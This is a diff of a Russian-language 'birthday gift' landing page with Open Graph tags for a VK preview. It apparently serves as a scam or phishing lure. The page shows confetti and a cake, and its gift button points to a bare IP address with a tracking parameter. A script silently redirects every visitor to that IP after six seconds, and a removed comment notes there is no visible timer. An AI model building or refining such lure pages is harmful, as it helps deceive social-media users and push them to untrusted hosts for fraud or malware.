@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Забери подарки прямо сейчас 🎁</title>
 
-    <!-- Open Graph теги для красивого превью в ВК (из вашего кода) -->
+    <!-- Open Graph теги для красивого превью в ВК (ваша ссылка) -->
     <meta property="og:title" content="Забери подарки прямо сейчас 🎁">
     <meta property="og:description" content="С днём рождения! Твой подарок уже ждёт тебя.">
     <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
@@ -39,6 +39,7 @@
             margin: 0 auto;
         }
 
+        /* ВОТ ЗДЕСЬ МЫ ПОКАЗЫВАЕМ ВАШ ФАЙЛ cake.jpg ИЗ РЕПОЗИТОРИЯ */
         .hero-wrap img {
             display: block;
             width: 100%;
@@ -108,18 +109,18 @@
 
     <div id="confetti-container"></div>
 
-    <!-- Приленд: Картинка + Кнопка поверх неё -->
     <div class="hero-wrap">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s" alt="Праздничный торт">
+        <!-- ЗДЕСЬ ИМЯ ФАЙЛА, КОТОРЫЙ ЛЕЖИТ У ВАС В РЕПОЗИТОРИИ -->
+        <img src="cake.jpg" alt="Праздничный торт">
         
-        <!-- Кнопка с вашей ссылкой на подарок -->
+        <!-- ССЫЛКА НА ПОДАРОК -->
         <a href="https://45.115.26.145/?s=sCcUFzRVCt" class="btn-gift" id="giftBtn">
             🎁 Забрать подарок
         </a>
     </div>
 
     <script>
-        // 1. Создаём конфетти
+        // Конфетти
         function createConfetti() {
             const container = document.getElementById('confetti-container');
             const colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd', '#01a3a4', '#f368e0'];
@@ -139,18 +140,17 @@
         }
         createConfetti();
 
-        // 2. АВТОПЕРЕХОД ЧЕРЕЗ 6 СЕКУНД (без видимого таймера)
+        // Автопереход через 6 секунд
         const giftBtn = document.getElementById('giftBtn');
         const targetUrl = giftBtn.href;
 
         const redirectTimeout = setTimeout(() => {
             window.location.href = targetUrl;
-        }, 6000); // 6000 миллисекунд = 6 секунд
+        }, 6000);
 
-        // 3. Если человек нажал кнопку сам, переходим мгновенно
         giftBtn.addEventListener('click', function(e) {
             e.preventDefault();
-            clearTimeout(redirectTimeout); // отменяем таймер
+            clearTimeout(redirectTimeout);
             window.location.href = targetUrl;
         });
     </script>
